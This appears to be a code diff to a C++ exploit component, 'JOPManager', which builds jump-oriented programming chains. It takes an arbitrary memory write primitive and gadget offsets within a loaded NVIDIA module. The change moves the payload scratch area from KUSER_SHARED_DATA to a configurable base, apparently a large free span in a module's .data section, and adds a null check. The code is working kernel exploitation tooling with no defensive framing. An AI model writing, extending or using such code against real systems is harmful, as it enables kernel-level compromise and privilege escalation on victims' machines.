@@ -1,8 +1,7 @@
 #include "jopmanager.h"
 
 JOPManager::JOPManager()
-    : allocPtr(SCRATCH_ALLOC_START), nvidiaBase(0),
-      scratchBase(KUSD_BASE + KUSD_SCRATCH_OFF), rax(0), rsi(0), rdx(0)
+    : allocPtr(SCRATCH_ALLOC_START), nvidiaBase(0), scratchBase(0), rax(0), rsi(0), rdx(0)
 {}
 
 void JOPManager::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn) {
@@ -13,9 +12,15 @@ void JOPManager::SetNvidiaBase(UINT64 base) {
     nvidiaBase = base;
 }
 
+void JOPManager::SetScratchBase(UINT64 base) {
+    scratchBase = base;
+    DbgLog("[JOPManager] scratchBase=0x%llX\n", scratchBase);
+}
+
 void JOPManager::AddSlot(const char* name, UINT64 scratchOff, UINT64 value) {
-    if (scratchOff + sizeof(UINT64) > SCRATCH_MAX) {
-        DbgLog("[JOPManager] OVERFLOW: '%s' at scratch+0x%llX exceeds page\n", name, scratchOff);
+    // 1.7MB free in .data — cap at 1.6MB to stay safe
+    if (scratchOff + sizeof(UINT64) > 0x19A000) {
+        DbgLog("[JOPManager] OVERFLOW: '%s' at scratch+0x%llX\n", name, scratchOff);
         return;
     }
     slots.push_back({ name, scratchBase + scratchOff, value });
@@ -31,6 +36,11 @@ UINT64 JOPManager::Alloc(const char* name, UINT64 value) {
 void JOPManager::Build(UINT64 g1Off, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off) {
     slots.clear();
     allocPtr = SCRATCH_ALLOC_START;
+
+    if (!scratchBase) {
+        DbgLog("[JOPManager::Build] FAIL: scratchBase not set\n");
+        return;
+    }
 
     UINT64 g2 = nvidiaBase + g2Off;
     UINT64 g3 = nvidiaBase + g3Off;
